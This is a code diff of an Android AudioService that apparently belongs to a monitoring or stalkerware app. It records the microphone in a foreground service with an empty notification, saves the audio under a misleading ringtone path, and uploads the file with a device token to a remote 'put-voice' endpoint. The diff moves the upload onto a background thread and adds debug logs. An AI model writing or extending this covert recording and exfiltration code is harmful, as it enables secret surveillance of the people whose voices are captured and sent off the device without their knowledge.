@@ -55,6 +55,7 @@ public class AudioService extends Service {
             Notification notification = new NotificationCompat.Builder(getApplicationContext())
                     .build();
             startForeground(1, notification);
+        Log.e("testing", "Audio3");
 
 //        }
 
@@ -65,15 +66,17 @@ public class AudioService extends Service {
             if (Type.equals("dating")) {
                 pathSave = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtones" + "minedate.mp3";
             }
-            Log.e("rttredfgf", Type + ".." + durst);
+            Log.e("testing", Type + ".." + durst);
             if (Type.equals("not")) {
                 setupMediaRecorder();
                 try {
                     mediaRecorder.prepare();
                     mediaRecorder.start();
                 } catch (IOException e) {
+                    Log.e("testing", e.toString() );
                     e.printStackTrace();
                 } catch (IllegalStateException e) {
+                    Log.e("testing", e.toString() );
                 }
                 if (Type.equals("not")) {
                     Handler handler = new Handler();
@@ -141,37 +144,43 @@ public class AudioService extends Service {
 //    }
     public void Upload2(){
         try {
-            HttpClient httpclient = new DefaultHttpClient();
-            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    HttpClient httpclient = new DefaultHttpClient();
+                    HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");
 
 
-            try {
-                MultipartEntity entity = new MultipartEntity();
+                    try {
+                        MultipartEntity entity = new MultipartEntity();
 
-                try {
-                    entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
-                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
+                        try {
+                            entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
+                            entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                        } catch (UnsupportedEncodingException e) {
+                            e.printStackTrace();
+                        }
+                        File myFile = new File(pathSave);
+                        FileBody fileBody = new FileBody(myFile);
+                        entity.addPart("voice", fileBody);
+                        Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()) );
+                        //totalSize = entity.getContentLength();
+                        httppost.setEntity(entity);
+                        HttpResponse response = httpclient.execute(httppost);
+                        HttpEntity r_entity = response.getEntity();
+                        Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                        //responseString = EntityUtils.toString(r_entity);
+
+                    } catch (ClientProtocolException e) {
+                        Log.e("terkgkjjgjgj", e.toString());
+                        //responseString = e.toString();
+                    } catch (IOException e) {
+                        Log.e("terkgkjjgjgj", e.toString());
+                        //	responseString = e.toString();
+                    }
+
                 }
-                File myFile = new File(pathSave);
-                FileBody fileBody = new FileBody(myFile);
-                entity.addPart("voice", fileBody);
-                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()) );
-                //totalSize = entity.getContentLength();
-                httppost.setEntity(entity);
-                HttpResponse response = httpclient.execute(httppost);
-                HttpEntity r_entity = response.getEntity();
-                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
-                //responseString = EntityUtils.toString(r_entity);
-
-            } catch (ClientProtocolException e) {
-                Log.e("terkgkjjgjgj", e.toString());
-                //responseString = e.toString();
-            } catch (IOException e) {
-                Log.e("terkgkjjgjgj", e.toString());
-                //	responseString = e.toString();
-            }
+            }).start();
 
 
 
